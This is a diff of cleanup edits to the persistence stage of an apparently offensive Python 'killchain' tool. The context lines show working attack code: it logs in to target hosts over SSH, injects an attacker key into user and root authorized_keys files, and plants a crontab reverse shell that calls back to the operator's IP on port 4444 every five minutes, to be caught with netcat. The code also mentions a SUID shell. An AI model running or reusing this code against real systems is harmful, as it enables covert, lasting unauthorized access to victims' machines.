@@ -4,12 +4,7 @@ Stage 6: Persistence mechanisms (SSH keys, crontab, SUID shell).
 """
 
 import os
-import re
-import time
-import socket
-import shutil
 import subprocess
-import concurrent.futures
 
 try:
     import paramiko
@@ -17,14 +12,14 @@ except ImportError:
     paramiko = None
 
 try:
-    from config import CFG, find_wordlist, find_all_wordlists
+    from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
     def find_wordlist(cat): return ""
     def find_all_wordlists(cat): return []
 
-from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 from core.killchain.lateral import _get_our_ip
+from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
 C_GREEN  = "\033[92m"
@@ -37,9 +32,7 @@ C_MAGENTA = "\033[95m"
 C_RESET  = "\033[0m"
 
 
-# ═══════════════════════════════════════════════
 # PARAMIKO SSH HELPERS (shared across stages)
-# ═══════════════════════════════════════════════
 
 
 def plant_persistence(host: str, user: str, password: str, port: int = 22) -> str:
@@ -60,7 +53,7 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
     persistence_methods = []
 
     try:
-        whoami = _ssh_exec(client, "whoami")
+        _ssh_exec(client, "whoami")
         is_root = _ssh_exec(client, "id") and "uid=0" in _ssh_exec(client, "id")
 
         # ── METHOD 1: SSH Key Injection ──────────────────────────
@@ -80,7 +73,7 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
                     ["ssh-keygen", "-t", "ed25519", "-f", key_path, "-N", "", "-q", "-C", "octopus"],
                     check=True, timeout=10
                 )
-            except Exception as e:
+            except Exception:
                 # Fallback: generate via paramiko
                 if paramiko:
                     key = paramiko.Ed25519Key.generate()
@@ -103,7 +96,8 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
                 persistence_methods.append("SSH key injection (authorized_keys)")
                 output += f"[+] SSH KEY INJECTED — connect with: ssh -i {key_path} {user}@{host}\n"
                 print(f"    {C_GREEN}[+] SSH key injected successfully{C_RESET}")
-                if am: am.record_ssh_key(user, "octopus")
+                if am:
+                    am.record_ssh_key(user, "octopus")
             else:
                 output += "[-] SSH key injection failed (may be write-protected)\n"
 
@@ -113,7 +107,8 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
                 _ssh_exec(client, f"echo '{pub_key}' >> /root/.ssh/authorized_keys", timeout=5)
                 _ssh_exec(client, "chmod 600 /root/.ssh/authorized_keys", timeout=5)
                 output += "[+] SSH key also injected into /root/.ssh/authorized_keys\n"
-                if am: am.record_ssh_key("root", "octopus")
+                if am:
+                    am.record_ssh_key("root", "octopus")
 
         # ── METHOD 2: Crontab reverse shell ──────────────────────
         print(f"    {C_CYAN}[*] Setting up crontab persistence...{C_RESET}")
@@ -129,7 +124,7 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
                 if "octopus" in verify:
                     persistence_methods.append(f"Crontab reverse shell → {our_ip}:4444 every 5min")
                     output += f"[+] CRONTAB persistence set — rev shell to {our_ip}:4444 every 5 min\n"
-                    output += f"    Catch with: nc -lvnp 4444\n"
+                    output += "    Catch with: nc -lvnp 4444\n"
                     print(f"    {C_GREEN}[+] Crontab persistence set{C_RESET}")
                 else:
                     output += "[-] Crontab write failed\n"
@@ -170,6 +165,4 @@ def plant_persistence(host: str, user: str, password: str, port: int = 22) -> st
         client.close()
 
     return output
-
-
 
